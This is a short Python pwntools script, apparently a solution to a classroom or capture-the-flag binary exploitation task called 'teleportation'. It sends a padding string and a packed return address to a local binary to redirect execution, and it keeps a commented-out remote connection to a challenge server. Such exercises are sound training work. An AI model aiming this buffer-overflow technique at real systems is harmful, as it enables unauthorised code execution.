from pwn import *
#Task4: teleportation
#conn = remote('140.113.207.240',8834)
conn = process('./tp')

r=conn.recv()
#print(r.decode('ascii'))
target=p64(0x4011B6)
conn.sendline(b'909090909090909090909090909090909090909090909090909090909090909090909090'+target)
r=conn.recvline()
print(r)
r=conn.recvrepeat()
#print(r.decode('ascii'))
conn.close()

